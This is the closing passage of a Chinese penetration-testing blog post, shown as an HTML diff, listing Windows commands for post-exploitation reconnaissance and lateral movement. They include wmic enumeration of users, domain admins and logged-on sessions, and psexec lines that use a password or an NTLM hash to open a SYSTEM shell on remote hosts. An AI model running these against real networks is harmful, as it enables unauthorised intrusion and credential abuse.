+<p>查询当前机器的操作系统位数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic cpu get DataWidth /format:list</span><br></pre></td></tr></table></figure></p>
+<p>查询当前机器的用户及组信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic useraccount list brief /format:list</span><br><span class="line"># wmic group list brief /format:list</span><br></pre></td></tr></table></figure></p>
+<p>查询当前机器所有用户的详细信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic useraccount list brief</span><br></pre></td></tr></table></figure></p>
+<p>查询当前机器所有服务的详细状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic service list brief</span><br></pre></td></tr></table></figure></p>
+<p>查询指定域的域管有哪些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic /node:rootkit path win32_groupuser where (groupcomponent=&quot;win32_group.name=\&quot;adm\&quot;,domain=\&quot;rootkit\&quot;&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>查看谁登陆过指定机器,适合用来找域管进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic /node:192.168.3.23 path win32_loggedonuser get antecedent</span><br></pre></td></tr></table></figure></p>
+<p>查询本机共享<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic share  get name,path,status</span><br></pre></td></tr></table></figure></p>
+<p>0x05 使用pstools套件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># psexec /accepteula \\192.168.3.122 -u klionsec\administrator -p &quot;admin!@#123&quot; -s -c -f &quot;cmd.exe&quot;	弹回一个system权限的cmdshell</span><br><span class="line"># psexec /accepteula \\192.168.3.23 -u klionsec\administrator -p lm:ntlm -s -c -f &quot;cmd.exe&quot;		适合03以下的系统</span><br></pre></td></tr></table></figure></p>
+<p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里只简单罗列一些实战经常可能会用到的基础命令,有些命令可能需要在管理权限[system或root]下才能运行,还有很多其它的系统命令工具没法一下子跟大家说完,后续咱们再慢慢来,有些命令在之前文章都附带的用过,比较简单,就各种命令工具本身来讲没有任何技术含量,甚至一些工具完全可以自己实现<code>有时真的没必要重复造轮子,在你没有别人写的好的情况下</code>,大家可能也发现了,很多实际渗透中的需求,系统自身早就为我们提供好了对应的工具,只是一直没去发掘而已,大可不必拿第三方工具来搞<code>尤其在有powershell的情况下</code>,这样也确实省去了不少的麻烦,比如,免杀,防护限制[上传,执行],等等…,总之,说了这么多,最终目的还是希望大家能利用这些东西真正帮自己做事情,利用目标已有工具,挖掘出更多高价值信息也是我们最想看到的,只简单的会用个命令,基本是没啥实际用的,能从命令结果探测到更多有价值的信息才是目的,比如,你知道netstat 是用来查目标系统网络连接的,但只知道这又有什么用呢,我们看连接的目的,主要还是想知道,当前系统中都跑了什么高危服务,有没有我们后期可以利用到的,哪些是跟目标内网机器的连接,看看有没有别人的tcp马,找找是那个程序发起的…等等,这里只是举个简单的例子,关于<code>linux篇</code>,我们待续…</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/win-cmd/">#win cmd</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/01/01/after-roding/">关于接下来的路</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/privilege/">privilege</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/python-basic/">python basic</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
